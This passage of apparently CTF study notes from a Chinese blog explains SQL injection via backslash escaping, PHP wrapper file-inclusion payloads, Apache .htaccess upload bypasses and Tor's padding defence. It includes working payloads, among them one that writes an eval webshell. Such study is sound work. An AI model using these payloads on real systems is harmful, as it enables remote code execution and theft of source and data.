title="巧妙运用反斜杠"></a>巧妙运用反斜杠</h3><p>当过滤词过多时,可以使用反斜杠来对已有的单引号进行转义,从而打乱引号的配对关系,让一些值为我们所控制</p><p>例如: 当查询语句为,此时<code>username</code>输入<code>\</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>整个语句就变成了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;&#x27;</span><br><span class="line">username后面的单引号被注释掉, 前面的单引号被迫和passwd后的单引号闭合,这样查询时的username的值为:</span><br><span class="line">&#x27; and passwd=</span><br></pre></td></tr></table></figure><p>然后我们可以在后面任意构造且,或等逻辑表达式,例如passwd中传入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">||substr(passwd,1,1)=&#x27;a&#x27;#</span><br><span class="line">这样整个语句就变成了</span><br><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||substr(passwd,1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure><p>更直观一些看: 语句变成了下面两个表达式的或判断</p><p>select * from users where <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>username&#x3D;’&#39; and passwd&#x3D;’</span>||<span style='color:black;background:yellow;font-family:hei;font-weight:bold'>substr(passwd,1,1)&#x3D;’a’</span>#</p><p>这样以来就可以进行盲注了</p><p>反斜杠和注释符<code>/**/</code>配合使用还可以让某些内容摆脱引号的控制,又如<a href="a65f6ebf.html">[git泄露,二次注入,DS_store]Comment</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/post/e3611a41.html"/>
      <url>/post/e3611a41.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1_概述"></a>1_概述</h1><p>PHP 带有很多内置 <strong>URL 风格的封装协议</strong>，可用于类似<code> fopen()</code>、<code> copy()</code>、<code> file_exists()</code> 和<code> filesize()</code>的文件系统函数。 除了这些封装协议，还能通过 <code>stream_wrapper_register()</code>来注册自定义的封装协议。</p><p>支持的协议:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="2-file-x2F-x2F-协议"><a href="#2-file-x2F-x2F-协议" class="headerlink" title="2_file:&#x2F;&#x2F;协议"></a>2_file:&#x2F;&#x2F;协议</h1><p>用于<strong>访问本地文件系统</strong>，在CTF中通常用来<strong>读取本地文件</strong><br>在<code> include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照<code>php</code>语法进行解析，这是<code>include()</code>函数所决定的。</p><p>此协议能否使用不受<code>PHP.ini</code>(php配置文件)中 <code>allow_url_fopen</code>和<code>allow_url_include</code>两个字段的值的影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on/off</span><br><span class="line">allow_url_include=on/Off</span><br></pre></td></tr></table></figure><p><code>file://</code>文件系统是php使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径时, 将基于当前的工作目录。</p><p>使用实例:</p><p>假设<code>include.php</code>的代码为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>那么通过<code>GET</code>中的<code>file</code>变量:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p>使用绝对路径来访问<code>E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p>使用相对路径来访问当前目录下的<code>phpinfo.txt</code></p><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p>访问一个网络上的地址</p><br><hr><br><h1 id="3-php-x2F-x2F-协议"><a href="#3-php-x2F-x2F-协议" class="headerlink" title="3_php:&#x2F;&#x2F;协议"></a>3_php:&#x2F;&#x2F;协议</h1><p>对<code>PHP.ini</code>配置文件的要求:</p><blockquote><p><strong><code>php://filter</code></strong> 在 <code>allow_url_fopen</code>和<code>allow_url_include</code>两个字段的值都是off的情况下也可以使用</p><p><strong><code>php://input、 php://stdin、 php://memory 和 php://temp</code></strong> 需要<code>allow_url_include</code>的值为on</p></blockquote><p>作用: </p><p>访问各个输入&#x2F;输出流（<code>I/O streams</code>），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于执行php代码。</p><br><h2 id="3-1-php-x2F-x2F-filter"><a href="#3-1-php-x2F-x2F-filter" class="headerlink" title="3.1_php:&#x2F;&#x2F;filter"></a>3.1_php:&#x2F;&#x2F;filter</h2><blockquote><p>参数解析, 参数之间用<code>/</code>来分隔开</p><table><thead><tr><th><strong>php:&#x2F;&#x2F;filter 参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。（必选）</td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。（可选）</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。（可选）</td></tr><tr><td>&lt;;  两个链的过滤器&gt;</td><td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></blockquote><p>示例1: <span id="meiya_person_03" style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>(利用cmd.php中名为cmd的变量)</strong></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>效果是读取<code>flag.php</code>的源码,并进行<code>base64</code>编码之后输出</p><p>参数<code>read</code>的值为<code>convert.base64-encode</code>,这是一个用于<code>base64</code>编码的<strong>过滤器</strong></p><p>参数<code>resource</code>的值为<code>flag.php</code>要读&#x2F;写的<strong>数据流</strong></p><p>假设有一个名为<code>hello.php</code>写了以下内容, 且同目录下有一个名为<code>flag.php</code>的文件</p><img src="/images/ctf-web02/image-20220923225648738.png" alt="image-20220923225648738" style="zoom:67%;" /><p>访问<code>hello.php</code>的效果:</p><img src="/images/ctf-web02/image-20220923225748400.png" alt="image-20220923225748400" style="zoom:67%;" /><p>再把这里输出的编码后的内容解码出来, 就可以得到<code>flag.php</code>的源码内容了</p><img src="/images/ctf-web02/image-20220923225849854.png" alt="image-20220923225849854" style="zoom:67%;" /><hr><p><strong>四类可用的<code>php://filter</code>过滤器:</strong></p><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于str_rot13()，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于strip_tags()，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th><strong>转换过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>convert.base64-encode  &amp; convert.base64-decode</td><td>等同于base64_encode()和base64_decode()，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode  &amp; convert.quoted-printable-decode</td><td>quoted-printable  字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th><strong>压缩过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>zlib.deflate  &amp; zlib.inflate</td><td>在本地文件系统中创建  gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress  &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建  bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt  对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt  对称解密算法</td></tr></tbody></table><br><br><p><strong>补充小知识点:</strong></p><p><strong><code>php</code>伪协议中,在任意位置套一层其他协议,虽然可能会产生报错,但是不影响输出,(无法找到对应的过滤器时就会跳过它),这在payload需要包含一些特殊字符时很好用,例如:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category=php://filter/meowers/read=convert.base64-encode/resource=flag</span><br><span class="line">?category=php://filter/read=convert.base64-encode/meowers/resource=flag</span><br><span class="line">//这里并不存在的&#x27;meowers&#x27;可以放在任意位置</span><br></pre></td></tr></table></figure><p><img src="/images/ctf-web02/image-20221020001536369.png" alt="image-20221020001536369"></p><h2 id="3-2-php-x2F-x2F-input"><a href="#3-2-php-x2F-x2F-input" class="headerlink" title="3.2_php:&#x2F;&#x2F;input"></a>3.2_php:&#x2F;&#x2F;input</h2><p>可以用来执行<code>POST</code>数据中的<code>php</code>代码</p><p>例如:  对于<code>include.php</code> 中的<code>file</code>变量: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br></pre></td></tr></table></figure><p>然后通过<code>HackBar</code>插件来POST一段php代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>效果: 成功执行了上述代码</p><img src="/images/ctf-web02/1.jpg" alt="1" style="zoom:67%;" /><p>如果有权限，还可以通过<code>POST</code>写入一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="4-data-x2F-x2F-协议"><a href="#4-data-x2F-x2F-协议" class="headerlink" title="4_data:&#x2F;&#x2F;协议"></a>4_data:&#x2F;&#x2F;协议</h1><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以<strong>用来执行PHP代码</strong>。一般需要用到<code>base64编码</code>传输</p><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,「要执行的php代码」</span><br><span class="line">data://text/plain;base64,「base64编码后要执行的php代码」</span><br></pre></td></tr></table></figure><p>示例:</p><p><code>include.php</code>中, 有<code>include($file)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/2.jpg" alt="2" style="zoom:100%;" /><p>成功执行了<code>&lt;?php phpinfo();?&gt;</code></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/3.jpg" alt="3" style="zoom:100%;" /><br><hr><br><h1 id="5-zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#5-zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="5_zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>5_zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h1><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :off/on</code></li></ul><p>作用：<code>zip:// &amp; bzip2:// &amp; zlib:// </code>均属于压缩流，<strong>可以访问压缩文件中的子文件</strong>，更重要的是<strong>不需要指定后缀名</strong>，可修改为任意后缀：jpg png gif xxx 等等。(将最终希望执行的文件压缩可以绕过很多对文件类型的验证)</p><p>示例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（**#编码为%23**）</span><br></pre></td></tr></table></figure><p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.zip</code> ，压缩包重命名为 <code>phpinfo.jpg</code>(绕过验证,假设只允许上传图片) ，并上传</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/4.jpg" alt="4" style="zoom:100%;" /><p>​由此访问了压缩文件内的<code>phpinfo.txt</code></p><hr><p>示例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>压缩<code> phpinfo.txt</code> 为 <code>phpinfo.bz2 </code>并上传（同样支持任意后缀名）</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p>效果和示例1相同 也访问到了<code>phpinfo.txt</code></p><hr><p>示例3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://file.gz</span><br></pre></td></tr></table></figure><p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传（同样支持任意后缀名）</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p>效果一样</p><br><hr><br><h1 id="6-http-x2F-x2F-amp-https-x2F-x2F-协议"><a href="#6-http-x2F-x2F-amp-https-x2F-x2F-协议" class="headerlink" title="6_http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F; 协议"></a>6_http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F; 协议</h1><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul><p>作用: 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/5.jpg" alt="5" style="zoom:100%;" /><br><hr><br><h1 id="6-phar-x2F-x2F-协议"><a href="#6-phar-x2F-x2F-协议" class="headerlink" title="6_phar:&#x2F;&#x2F;协议"></a>6_phar:&#x2F;&#x2F;协议</h1><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/6.jpg" alt="6" style="zoom:100%;" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache的文件解析漏洞(特性)</title>
      <link href="/post/aeaad0f.html"/>
      <url>/post/aeaad0f.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.werner.wiki/file-resolution-vulnerability-apache/">https://blog.werner.wiki/file-resolution-vulnerability-apache/</a></p><h1 id="1-多后缀名"><a href="#1-多后缀名" class="headerlink" title="1.多后缀名"></a>1.多后缀名</h1><p>Apache认为, 一个文件可以有多个后缀,如:<code>111.txt.png.mp3.abc</code></p><p>服务器在读取时, 会从右向左读取. 如果认识这个后缀, 就会以此来识别文件的类型, 如果不认识, 就会继续向左读取下一个后缀</p><p>例如上面这个文件名, 读取第一个<code>abc</code>发现不认识, 继续向左, 读取到<code>mp3</code>, 认识了, 那么就把此文件当成一个<code>mp3</code>文件来处理</p><p>如果一直到最左边都不认识, 则会把该文件当做<strong>默认类型</strong>进行处理, 一般是<code>text/plain</code>.</p><br><p>Apache认识的文件后缀记录在 名为<code>mime.types</code>的文件, 其路径为  <code>apache安装目录/conf/mime.types</code></p><p>这个文件很长:</p><img src="/images/ctf-web01/image-20220923214848650.png" alt="image-20220923214848650" style="zoom: 67%;" /><p>由此带来的问题:</p><p>有的网站为了防止用户上传恶意文件, 会写脚本对文件后缀进行检测, 如果不了解apache的这个特性, 可能编写的检测代码只会检测文件名最后面的这个后缀.</p><p>这样,如果用户上传一个名为<code>xxx.php.abc</code>的文件, 就能够绕过检测. 同时,这个文件在上传后还能够被apache识别为<code>php</code>文件并执行.</p><blockquote><p>然而在实际测试的时候, 发现类似<code>aaa.php.xxx</code>的文件并不会被作为<code>php</code>程序执行</p><p>猜测:</p><p>Apache虽然能够识别这是一个<code>php</code>文件, 但是将它交给<code>php</code>解释器之后, <code>php</code>的文件后缀解析规则却不是这样, 因此<code>php</code>解释器并不认为这是一个<code>php</code>文件, 故而不会把它当作<code>php</code>文件执行, 而是直接输出了文件内容.</p></blockquote><p>在Apache的模块的配置文件中找到了<code>php5.conf</code> :</p><p>其中规定: 被当做<code>php</code>程序执行的文件名要符合正则表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.+\.ph(p[345]?|t|tml)$</span><br></pre></td></tr></table></figure><p>在<code>mime.types</code>中, 也有这一段:</p><img src="/images/ctf-web01/image-20220923215253544.png" alt="image-20220923215253544" style="zoom:67%;" /><p>由此可见, <code>php3,php4,php5,pht,phtml </code>这几个后缀都能被识别为<code>php</code>文件</p><p>因此, 在绕过检测时, 也可以将文件后缀改成这几个.</p><p>测试，先准备文件<code>text.php</code>，其内容是输出Hello World：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#x27;HELLO WORLD&#x27;; ?&gt;</span><br></pre></td></tr></table></figure><p>然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以<code>php、phtml、pht、php3、php4和php5</code>为后缀，能成功看到“HELLO WORLD”；以<code>phps</code>为后缀，会报403错误，Forbidden；以<code>php3p</code>为后缀，<strong>会在浏览器中看到源码</strong>。</p><br><hr><br><h1 id="2-htaccess特性"><a href="#2-htaccess特性" class="headerlink" title="2.htaccess特性"></a>2.htaccess特性</h1><blockquote><p><code>htaccess</code>文件是Apache服务器中的一个配置文件，<strong>提供了针对目录改变配置的方法</strong>,<strong>负责相关目录下的网页配置</strong>。通过<code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p><code>.htaccess</code>文件可以配置很多事情，如<strong>是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制</strong>。</p></blockquote><br><p>此处只关心<code>.htaccess</code>文件的一个作用——<strong>MIME类型修改</strong>。如在<code>.htaccess</code>文件中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx </span><br></pre></td></tr></table></figure><p>就能成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.xxx</code>的文件被Apache当做<code>php</code>文件。(<strong>相当于建立一个<code>xxx</code>后缀到<code>php</code>文件类型的映射</strong>)</p><p>另一种写法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该语句会让Apache把<code>shell.jpg</code>文件解析为<code>php</code>文件。</p><p>例题参考: <a href="2e610037.html">[MRCTF2020]你传你🐎呢</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TOR的防御机制PADDING</title>
      <link href="/post/212eacc4.html"/>
      <url>/post/212eacc4.html</url>
      
        <content type="html"><![CDATA[<p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold;font-size:25px'>前置的一些基础原理见: <a href="75310f08.html">TOR原理</a></span></p><h1 id="0-概述"><a href="#0-概述" class="headerlink" title="0_概述"></a>0_概述</h1><p><a href="75310f08.html">TOR原理</a>那篇文章的第三部分已经说明过, TOR cell是TOR中的基本通信单元, 一个TOR cell的大小固定为<strong>512</strong>或<strong>514</strong>字节</p><p>尽管TOR的机制能够有效地保护通信双方的身份以及通信内容不被泄露, 但是其实很早就有研究提出可以通过指纹攻击的方式来从流量模式 (<strong>例如数据包的序列特征</strong>) 入手来检测出TOR流量了. 对于监管者 (例如运营商) 来说, 其实也并不用彻底掌握用户到底在暗网中看到了啥不该看的内容, 只需要简单地检测出有暗网流量产生, 然后再把它BAN掉就行了. 因此这类能够有效检测出TOR流量的指纹攻击手段确实对TOR的安全性产生了不小的威胁. TOR必须采取一定的应对手段来进一步提升自己的安全性. </p><blockquote><p>•Kwon, Albert et al. “Circuit Fingerprinting Attacks: Passive Deanonymization of Tor Hidden Services.” <em>USENIX Security Symposium</em> (2015).</p><p>这篇文章利用简单的决策树算法, 依赖的特征仅仅是<code>Client</code>或<code>HS</code>在构建<code>IPO</code>或<code>RPO</code>链路时收发携带不同<code>Command</code>的Tor cell的顺序关系, 就能够检测出当前链路的类型(<strong>Client端IPO&#x2F; Client端RPO&#x2F; HS端IPO&#x2F; HS端RPO</strong>)</p><p>当时也是立马引起了Tor官方的反应:</p><img src="/images/tor-padding/image-20220822120634208.png" alt="image-20220822120634208" style="zoom:67%;" /><p>很快, Tor官方就提出了应对手段, 并在0.4.1.1-alpha版本里首次实现, 也就是本篇讨论的重点:  <strong><code>Padding</code>机制</strong>.</p></blockquote><p><code>Padding</code>说白了就是在正常的Tor流量中混入一些特殊且无用的数据包(Tor cell),  这些数据包由<code>Client</code>和 某个Tor链路上的一个<code>OR</code>协商后互相发送和接收 , 以破坏在<code>Client</code>和这个<code>OR</code>之间截获流量的观察者所看到的「Tor流量在数据包分布等方面的特征」, 这些刻意发送的数据包被称为 <code>Padding cell</code>.  </p><p>目前官方提出了两种<code>Padding</code>方式: <code>connection-level padding</code>和<code>circuit-level padding</code>, 分别应对处在不同位置的攻击者:</p><div align='center' style='font-family:hei;font-weight:bold'>    (下图中上方的链路为IPO链路, 下方的链路为RPO链路)</div><img src="/images/tor-padding/image-20220822153045204.png" alt="image-20220822153045204" style="zoom:67%;" /><p>对于<code>connection-level padding</code>来说,后者就是普通的数据流量, 为了有所区分,当<code>circuit-level padding</code>工作时,<code>connection-level padding</code>不工作. </p><br><hr><br><h1 id="1-connection-level-padding"><a href="#1-connection-level-padding" class="headerlink" title="1_connection-level padding"></a>1_connection-level padding</h1><p>此种<code>Padding cell</code>的 <code>Command</code>字段值为<strong>0</strong>(<code>PADDING</code>)  (见<a href="75310f08.html">TOR原理3.2</a>) , 一般由<code>Client</code>和<code>Entry</code>之间协商后发送和接收.</p><p><code>connection-level padding</code>较为简单,  应对在<code>Client</code>和<code>Entry</code>之间控制了任何普通的非Tor网络节点的攻击者, 这些截获流量的攻击者因为没有Tor链路上<code>OR</code>之间协商的密钥, 能看见的只是被下层的TLS等协议加密后的密文流量.  </p><p>而与此相对, 即使不是Tor cell的接收者, 一个Tor链路上的<code>OR</code>也能够解读出一个Tor cell的前3字节内容, 这部分内容包含2字节的<code>Circuit ID</code>和1字节的<code>Command</code>, 能够解读<code>Command</code>字段也就意味着<code>OR</code>都能够识别出此类<code>Padding cell</code>. 因此, 如果一个攻击者控制了Tor链路上<code>Entry</code>这样的节点, <code>connection-level padding</code>也就失效了. </p><img src="/images/tor-padding/image-20220822154318021.png" alt="image-20220822154318021" style="zoom:67%;" /><p>在<code>Client</code>和<code>Entry</code>之间应用<code>connection-level padding</code>时:</p><p>两个节点共同持有一个关于TLS连接应用数据的计时器. 每当两端收到一个正常的数据包,它们都会根据一个特定的超时分布在1.5s至9.5s之间取一个<strong>超时值</strong>, 如果在这个超时值之前收到了下一个携带真实数据的Tor cell,那么重新选择该值; 如果在此之前没有收到真实的Tor cell,那么将会发送<code>Padding cell</code></p><p>由此以来, 在不超过10s的超时时间到达之前, 链路上总会有真实的Tor cell或者<code>Padding cell</code>被发送, 那么分不清真实Tor cell和<code>Padding cell</code>的链路上的攻击者就无法通过数据包间隔时间等特征来记录流量模式</p><br><hr><br><h1 id="2-circuit-level-padding"><a href="#2-circuit-level-padding" class="headerlink" title="2_circuit-level padding"></a>2_circuit-level padding</h1><p>假设攻击者控制了Tor 链路上的<code>Entry</code>节点. 那么他能够看见在此被TLS解密后的Tor cell, 并读取每个Tor cell的前3字节数据. 也就能识别并丢弃来自<code>connection-level padding</code>的<code>Padding cell</code></p><p>通过记录流量特征, 攻击者还能够察觉当前链路的类型, 是访问互联网服务的三跳链路, 还是用于访问<code>HS</code>的<code>IPO</code>或<code>RPO</code>链路</p><p><code>circuit-level padding</code>的目的就是避免控制了<code>Entry</code>的攻击者识别出链路的类型</p><img src="/images/tor-padding/image-20220822161841331.png" alt="image-20220822161841331" 